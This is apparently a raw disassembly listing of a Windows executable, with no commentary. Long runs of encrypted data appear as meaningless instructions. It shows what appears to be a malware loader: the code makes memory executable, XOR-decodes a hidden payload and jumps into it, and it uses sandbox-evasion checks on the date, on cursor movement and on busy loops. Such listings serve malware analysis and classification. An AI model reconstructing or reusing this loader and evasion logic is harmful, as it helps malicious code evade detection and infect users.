or [ eax ] al
add [ ecx + ebx * 4 - 0x480fffbc ] cl
inc esi
add [ eax - 0x77 ] al
inc esi
add al cl
lea eax [ esi ]
pushad
add [ esi ] 0xffffff8d
inc eax
add [ esi + esi * 4 + 0x6070047 ] cl
push esp
inc esi
outsd
jb r-xdata
pop es
push es
insd
xor [ ebx + eax ] esi
add [ eax ] al
str [ ecx + ecx * 2 ]
push esp
add [ eax ] al
push cs
outsb
or dl [ ebx + 0x63 ]
jb r-xdata
adc [ ebx ] al
add [ eax ] al
push es
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ ebx + eax ] edx
add [ eax ] al
pop es
add [ edi ] al
inc edx
jne r-xdata
pop ebp
scasb [ edi ]
push cs
rcr [ edi ] 0x1
sbb [ ecx + 0x59595229 ] esi
xor [ edx + ebp * 4 ] edi
push cs
scasb [ edi ]
push cs
rcr [ edi ] 0x1
sbb eax 0x59523bb1
pop ecx
mov al 0x7b
inc edx
pop ecx
pop ecx
leave
leave
leave
leave
ficomp [ ebp - 0x66e32bf7 ]
or [ ebx ] esi
pop eax
rdpmc
pop edx
xor ecx ebp
out 0x12 eax
aad 0xa6
out dx al
popfd
pop ecx
pop ecx
pop ecx
mov cl 0x5d
inc esp
pop ecx
pop ecx
ficomp [ ebp - 0x16e32bbf ]
or esp edx
fdivr [ 0x9a6a6a6 ]
rol [ edi ] 0x1
adc [ ecx + 0x595952f1 ] esi
rcr [ edi ] 0x1
insd
xor ebx edi
pop ecx
leave
leave
rcr bh 0x1
cmc
pop ecx
pop ecx
pop ecx
mov cl 0x9f
push edx
pop ecx
pop ecx
xor [ edx ] eax
sub al 0xd3
test eax 0x151fd00e
mov cl 0xe1
push edx
pop ecx
pop ecx
rol [ ecx - 0x5520c2cf ] cl
sub al 0xe
sub_47b6a8
push ebp
mov ebp esp
add esp 0xffffffec
nop
nop
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push r-xdata
call sub_47b6a8
leave
leave
leave
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ ebp - 0x8 ] eax
nop
nop
nop
lea eax [ ebp - 0x10 ]
push eax
push 0x40
push 0x5bb9
mov eax [ ebp + 0x8 ]
push eax
call [ ebp - 0x8 ]
nop
nop
xor eax eax
mov [ ebp - 0xc ] eax
push cs
pop ecx
leave
leave
or [ eax + 0x595949e6 ] esi
leave
leave
leave
leave
aas
ror [ edi + ecx * 4 ] 0x1
mov al 0x61
outsb
pop ecx
pop ecx
leave
leave
leave
leave
leave
aam 0xdc
and [ esi + 0x6a2db1a6 ] esp
pop ecx
pop ecx
aam 0x1c
test [ eax + 0x595914cb ] esi
push cs
rcr [ edi ] 0x1
jne r-xdata
nop
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0xc ]
mov al [ eax ]
mov [ ebp - 0x11 ] al
mov al [ ebp - 0x11 ]
xor al 0x59
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0xc ]
mov [ edx ] al
nop
nop
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x5bba
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1ec8
mov [ ebp - 0x4 ] eax
jmp [ ebp - 0x4 ]
leave
leave
leave
leave
leave
leave
cmpsb [ esi ] [ edi ]
andnps xmm6 [ eax + 0x59597aba ]
leave
leave
leave
leave
leave
leave
leave
push esi
out dx al
pop ds
dec ebp
mov al 0x76
jg r-xdata
push esi
ja r-xdata
pop ebp
scasb [ edi ]
push cs
rcr [ edi ] 0x1
sbb [ ecx + 0x59595229 ] esi
xor [ edx + ebp * 4 ] edi
push cs
scasb [ edi ]
push cs
rcr [ edi ] 0x1
sbb eax 0x59523bb1
pop ecx
mov al 0x7b
inc edx
pop ecx
pop ecx
leave
leave
leave
leave
ficomp [ ebp - 0x66e32bf7 ]
or [ ebx ] esi
pop eax
rdpmc
pop edx
xor ecx ebp
out 0x12 eax
aad 0xa6
out dx al
popfd
pop ecx
pop ecx
pop ecx
mov cl 0x5d
inc esp
pop ecx
pop ecx
ficomp [ ebp - 0x16e32bbf ]
or esp edx
fdivr [ 0x9a6a6a6 ]
rol [ edi ] 0x1
adc [ ecx + 0x595952f1 ] esi
rcr [ edi ] 0x1
insd
xor ebx edi
pop ecx
leave
leave
rcr bh 0x1
cmc
pop ecx
pop ecx
pop ecx
mov cl 0x9f
push edx
pop ecx
pop ecx
xor [ edx ] eax
sub al 0xd3
test eax 0x151fd00e
mov cl 0xe1
push edx
pop ecx
pop ecx
rol [ ecx - 0x5520c2cf ] cl
sub al 0xe
sub_47f8e7
xor eax 0xd0a6a693
fucomip st5
pop ecx
pop ecx
pop ecx
ficomp [ ebp - 0x4ae32b9f ]
or [ eax - 0x595958e9 ] esi
leave
leave
rcr bh 0x1
rcr [ ecx + 0x59 ] 0x59
mov cl 0x14
xchg ebx eax
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
xor [ esi + 0x18 ] edi
xor [ edx ] eax
push cs
rcr bh 0x1
lds ebx [ ecx + 0x59 ]
pop ecx
mov al 0x0
mov bh 0xa6
cmpsb [ esi ] [ edi ]
leave
leave
leave
leave
leave
leave
aam 0xdc
frstor [ edx + 0x6ab0a6a6 ]
mov eax [ 0xffffffffd03fa6a6 ]
and al 0xb1
mov al 0xd3
mov al [ 0xffffffffc9c9a6a6 ]
leave
leave
push cs
mov al 0x41
movsb [ edi ] [ esi ]
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
leave
leave
xor eax [ edi + 0x33 ]
cmpsb [ esi ] [ edi ]
shl [ ecx ] 0x1
mov al 0x75
mov [ 0xffffffffc9c9a6a6 ] al
leave
leave
sahf
pop ecx
pop esi
pop ecx
pop eax
pop ecx
cmpsb [ esi ] [ edi ]
sub al 0xb9
rcr [ ecx * 4 - 0x59589750 ] 0x1
cmpsb [ esi ] [ edi ]
aam 0x1c
cmpsb [ esi ] [ edi ]
or [ eax - 0x59595b22 ] esi
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
aas
rcr [ ecx * 4 - 0x434f672e ] 0x1
pop ebx
pop ecx
pop ecx
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
fdiv [ ebp + 0x59595b75 ]
or dh [ ebx ]
pop ebp
xor [ ecx + 0x69 ] ebx
pop ecx
pop ecx
xor [ ecx + 0x6a595858 ] ecx
or [ edx ] 0xa6
iretd
sub_47faab
cld
xchg [ esi - 0x740b4e5a ] ah
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
fcomp [ ecx + 0x595f52b0 ]
pop ecx
leave
rcr [ edi ] cl
insd
xor [ ebp + 0x53 ] esp
jpe r-xdata
sbb al 0xa5
mov cl 0x62
xchg edx eax
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
or [ ecx - 0x59596e24 ] esi
mov al 0x5c
test al 0xa6
cmpsb [ esi ] [ edi ]
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
rcl [ 0x594d9bb0 ] cl
pop ecx
or esp edx
sbb al 0xb5
or esp edx
fcomp [ ebp + 0x9a6a6a5 ]
cmpsb [ esi ] [ edi ]
iretd
rcr [ 0xffffffffa69262b1 ] 0x1
sub_47fe85
rcr [ ecx + edx * 2 ] cl
xor ebx [ ecx - 0x5a ]
or [ 0xffffffffb9b099dc ] edx
push esi
pop ecx
pop ecx
leave
leave
or al 0xd2
mov ch 0x8
or cl [ edi ]
push cs
mov al 0x34
push ecx
pop ecx
pop ecx
leave
or esp edx
sbb eax 0x64b0157d
test al 0xa6
cmpsb [ esi ] [ edi ]
leave
leave
leave
leave
leave
leave
leave
leave
leave
cmpsb [ esi ] [ edi ]
iretd
sub_47feeb
cmc
pop ecx
pop ecx
pop ecx
push es
pop es
add dl dl
mov esp 0x98da9a04
pop ebx
mov al 0xf5
pop ebp
pop ecx
pop ecx
leave
xor ebx [ ecx - 0x5a ]
into
cmc
pop ecx
pop ecx
pop ecx
push es
0xc9c9c9c9 0xc9c9
leave
leave
leave
leave
leave
leave
leave
aas
shl [ ebp * 4 - 0x2fc0582e ] 0x1
and al 0xaf
mov al 0xce
pop esp
pop ecx
pop ecx
aas
rcl [ ebx + ecx * 4 ] 0x1
add [ ebx ] dh
sub eax 0x8d14d03f
add [ ebx ] dh
and [ edi ] edi
rcl [ edi + ecx * 4 ] 0x1
mov al 0xec
pop ecx
pop ecx
pop ecx
leave
leave
leave
leave
leave
leave
cmpsb [ esi ] [ edi ]
into
int1
pop ecx
pop ecx
pop ecx
mov al 0x55
pushfd
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
xor ebx [ ecx ]
mov al 0x5d
dec ecx
pop ecx
pop ecx
leave
leave
leave
leave
leave
leave
leave
leave
leave
sahf
sbb al 0xe1
add [ edi + esi ] edi
cmpxchg dh dl
movsd [ edi ] [ esi ]
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
push esi
fst [ edx + 0x59 ]
pop ecx
pop ecx
cmpsb [ esi ] [ edi ]
sub al 0xbd
rcr [ esi - 0x5958134f ] cl
cmpsb [ esi ] [ edi ]
add [ edx - 0x67 ] ch
sbb [ eax - 0x59594a18 ] esi
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
aas
ror [ ecx + edi * 4 ] 0x1
mov al 0x55
mov [ esi - 0x3636365a ] esp
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
pushad
add eax 0xdd564d7d
pop ebp
pop ecx
pop ecx
out 0xf1 al
cmp [ ecx + 0x59 ] bl
sahf
sbb eax 0x63c1417d
pop ecx
pop ecx
mov al 0xe1
0xc9c9a6a6 0xc9c9
cmpxchg [ edi + 0x5e ] bh
pop ecx
pop ecx
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
add [ ebx ] dh
cmp [ edi ] bh
rcl [ ecx + eax * 4 ] 0x1
add [ eax - 0x595964de ] dh
leave
push esi
frstor [ eax + 0x56a6a689 ]
out dx al
inc esi
mov al 0x5d
xchg [ esi - 0x4f602d5a ] esp
imul ebx [ esi - 0x3636595a ] 0xb06d2fa6
and dl 0xa6
cmpsb [ esi ] [ edi ]
rol [ ecx + 0x4904d03f ] cl
push 0xffffff82
aas
rol [ ebx + ecx * 2 ] 0x1
rol [ esi - 0x591b9e50 ] cl
cmpsb [ esi ] [ edi ]
leave
leave
shl [ ecx - 0x596e7e50 ] cl
cmpsb [ esi ] [ edi ]
leave
add esi [ ebx ]
and [ edi ] edi
ror [ ebx + ebx * 4 ] 0x1
mov al 0x84
loop r-xdata
cmpsb [ esi ] [ edi ]
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
rol [ eax + 0x7f04d03f ] cl
rol [ ecx + 0x7104d03f ] cl
mov al 0xe8
out 0xa6 eax
cmpsb [ esi ] [ edi ]
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
push esi
int3
sub_4811ae
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
rcr [ 0x1a5dee56 ] cl
mov al 0xd8
jmp r-xdata
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
or cl [ edi ]
mov al 0x93
out dx al
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
mov cl 0xd
and [ esi + 0x550cd2a6 ] 0xb1
and [ esi - 0x59f6595a ] eax
sub al 0x51
mov cl 0x63
xchg [ esi - 0x584fff5a ] esp
0xc9c9a6a6 0xc9c9
sub_4811c3
cmpsb [ esi ] [ edi ]
leave
leave
or [ esi + 0x3d38b91c ] ebx
das
cmp [ esi + 0x3029bd1c ] bl
push 0x6b
mov al 0xc9
xchg ecx eax
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
leave
cmpsb [ esi ] [ edi ]
into
mov ch 0x59
pop ecx
pop ecx
ficomp [ ebp - 0x4a232bab ]
movsb [ edi ] [ esi ]
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
mov al 0x54
mov eax 0x5a3fa6a6
sbb eax 0xee56797d
cdq
or edx edx
lahf
mov cl 0x21
mov ch 0xa6
cmpsb [ esi ] [ edi ]
ficomp [ ebp + 0x7d1dd055 ]
dec ecx
fcomp [ ecx - 0x10a922aa ]
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
mov al 0x1c
hlt
sub_481305
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push j_sub_4039f4#2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481334
retn
sub_481338
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039f4
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4815ad
retn
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleViewportExtEx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleViewportExtEx
call GetLastError
mov [ rw-data ] eax
nop
nop
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
mov [ rw-data ] 0x5bbc
nop
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleViewportExtEx
jmp r-xdata
mov [ rw-data ] 0x3061
mov [ rw-data ] 0x1
nop
jmp r-xdata
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleViewportExtEx
nop
nop
nop
inc [ rw-data ]
cmp [ rw-data ] 0x243e
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
mov [ rw-data ] 0x1ec8
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleViewportExtEx
mov [ rw-data ] 0x1
nop
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleViewportExtEx
inc [ rw-data ]
cmp [ rw-data ] 0x8db5
jne r-xdata
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleViewportExtEx
nop
push 0x4
push 0x3000
push 0x1d4a3756
push 0x0
call VirtualAlloc
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x0
je r-xdata
nop
nop
mov [ rw-data ] 0x1
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
inc eax
mov ecx 0x9f
xor edx edx
div ecx
mov eax [ rw-data ]
add eax [ rw-data ]
mov [ eax ] dl
inc [ rw-data ]
cmp [ rw-data ] 0x1d4a3755
jne r-xdata
nop
push 0x8000
push 0x0
mov eax [ rw-data ]
push eax
call VirtualFree
mov [ rw-data ] 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleViewportExtEx
inc [ rw-data ]
cmp [ rw-data ] 0x898e
jne r-xdata
xor eax eax
mov [ rw-data ] eax
nop
push rw-data
call GetCursorPos
nop
push 0x25
call sub_406244
nop
cmp [ rw-data ] 0x7
jbe r-xdata
inc [ rw-data ]
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
push rw-data
call GetCursorPos
nop
nop
mov eax [ rw-data ]
sub eax [ rw-data ]
cmp eax 0x17
jbe r-xdata
nop
push 0x0
call sub_47b6a8
jmp r-xdata
sub_481610
pop ecx
add [ eax ] al
add [ eax ] bl
push ss
dec eax
add al dl
pop esi
inc eax
add [ eax - 0x3bffbfa2 ] ah
pop esp
inc eax
add [ eax + 0x5c ] dh
inc eax
add [ eax + 0x5f ] cl
inc eax
add [ eax ] bl
pop edi
inc eax
add [ eax ] ch
insd
inc eax
add al bh
insb
inc eax
add [ eax + 0x6d ] ah
inc eax
add [ eax ] dh
insd
inc eax
add ah bh
adc [ ecx ] eax
int3
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_481610
call sub_405e5c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45de50
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_45de68
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45dee8
call sub_403f00
sub_40114f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4057b4
sub_401159
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4057c8
sub_401224
jmp [ __import_lookup_table_0(kernel32:CreateThread) ]
ExitThread
jmp [ ExitThread@IAT ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_40123c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_401244
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_40124c
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401274
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_40129c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012bc
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012dc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
sub_4012fc
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
sub_401304
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_40130c
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40131c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401340
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
sub_401358
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401370
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ac2
jmp sub_4039f4
sub_401ac9
mov al [ rw-data ]
pop ebp
retn
sub_401ba6
jmp sub_4039f4
sub_401c74
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402288
retn
sub_402274
jmp sub_4039f4
sub_40241a
jmp sub_4039f4
sub_4026b9
jmp sub_4039f4
sub_40277c
call sub_405e10
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405e10
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027d0
mov [ rw-data ] edx
call sub_403fd8
sub_402834
push eax
push edx
push ecx
call sub_405e10
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402828
retn
sub_402850
retn
sub_4028a4
retn
sub_4028a8
push ebx
call sub_405e10
mov ebx [ eax + 0x4 ]
call sub_405e10
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a60
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a70
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402b0c
mov edx [ eax + 0x1c ]
call sub_402ac4
retn
sub_402b9f
retn
sub_402ba0
xor ecx ecx
mov cl [ edx ]
inc ecx
xchg edx eax
call sub_4028c8
retn
sub_402db0
mov ecx 0xff
call sub_402dbc
retn
sub_402de0
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402dfc
jmp sub_402dfc
sub_402df9
retn
sub_403189
jmp sub_4039f4
sub_4031dc
fninit
fwait
fldcw [ rw-data ]
retn
sub_40322c
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403238
push ebx
mov ebx eax
mov eax ebx
call sub_403268
call sub_4026cc
mov edx eax
mov eax ebx
call sub_4032ac
pop ebx
retn
sub_403254
push ebx
mov ebx eax
mov eax ebx
call sub_403304
mov eax ebx
call sub_4026ec
pop ebx
retn
sub_403268
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403290
call sub_40362c
test dl dl
jle r-xdata
retn
call sub_403614
sub_403350
retn
sub_4033d8
jmp sub_4039f4
sub_4033df
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4034e8
mov eax 0x8000ffff
retn
sub_4034f0
retn
sub_4034f4
retn
sub_4034f8
retn
sub_4035ed
jmp sub_403740
sub_4035f2
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403a54
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_403614
sub_403614
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_40361c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_40362c
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_40363c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_403704
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403720
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403aed
retn
sub_403c30
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403cbe
jmp sub_403740
sub_403d1e
jmp sub_403740
sub_403d38
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403c30
mov [ rw-data ] 0x0
call sub_403cd8
retn
sub_403e71
retn
sub_403fd3
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403fd8
mov [ rw-data ] eax
call sub_403f00
sub_40406c
push eax
call ExitThread
sub_404298
retn
sub_4042d4
retn
sub_4042e2
retn
sub_4042fb
retn
sub_40430c
retn
sub_4043f3
retn
sub_404524
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404540
jmp sub_404540
sub_404589
retn
sub_404591
retn
sub_4045d3
retn
sub_40472c
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
sub_404744
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_40489c
retn
sub_4048ae
retn
sub_4048b0
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404aa4
mov ecx 0x1
jmp sub_404a10
sub_404aae
retn
sub_404ae4
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402828
call [ rw-data ]
retn
sub_404be8
mov ecx 0x1
jmp sub_404afc
sub_404bf2
retn
sub_404bf4
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402828
call [ rw-data ]
retn
sub_404e1a
retn
sub_404e1c
push edx
call sub_4026cc
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_404aa4
pop eax
sub_404e30
push eax
call sub_404be8
pop eax
call sub_4026ec
retn
sub_404e40
mov al 0x11
jmp sub_402828
sub_404e6b
retn
sub_404e7c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404d28
pop ebp
retn 0x4
j_sub_404afc
jmp sub_404afc
sub_404e91
retn
sub_404e94
call sub_405034
retn
sub_4050c0
call sub_405098
retn
sub_405409
jmp sub_4039f4
sub_405574
call sub_405584
retn
sub_40557c
call sub_4055a4
retn
sub_405584
push ebx
mov ebx eax
mov eax 0x8
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_40563f
jmp sub_403740
sub_405660
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_4056d4
jmp sub_4039f4
sub_4056db
pop ecx
pop ebp
retn
sub_405754
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405760
add eax 0x4
push eax
call sub_401304
retn
sub_40576c
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402828
sub_40577c
call sub_403238
mov [ eax + 0x4 ] 0x1
retn
sub_4057b4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_4012fc
pop ebp
retn 0x4
sub_405aa3
jmp sub_4039f4
sub_405aaa
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405b47
jmp sub_4039f4
sub_405b4e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405b97
jmp sub_4039f4
sub_405b9e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405c62
jmp sub_4039f4
sub_405c69
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405cba
jmp sub_4039f4
sub_405cc1
pop ebp
retn
sub_405d98
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_405db8
push eax
push 0x40
call LocalAlloc
retn
sub_405dc4
mov eax 0x10
retn
sub_405e50
mov eax rw-data
call sub_405660
retn
sub_405ec5
jmp sub_4039f4
sub_405ecc
pop ebp
retn
sub_405ed0
sub [ rw-data ] 0x1
retn
sub_405ed8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405ef4
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405f3d
jmp sub_4039f4
sub_405f44
pop ebp
retn
sub_405f48
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FileTimeToDosDateTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToDosDateTime) ]
FileTimeToLocalFileTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
FindClose
jmp [ __import_lookup_table_6(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_6(kernel32:FindFirstFileA) ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedDecrement
jmp [ __import_lookup_table_6(kernel32:InterlockedDecrement) ]
InterlockedExchange
jmp [ __import_lookup_table_6(kernel32:InterlockedExchange) ]
InterlockedIncrement
jmp [ __import_lookup_table_6(kernel32:InterlockedIncrement) ]
FreeResource
jmp [ __import_lookup_table_6(kernel32:FreeResource) ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
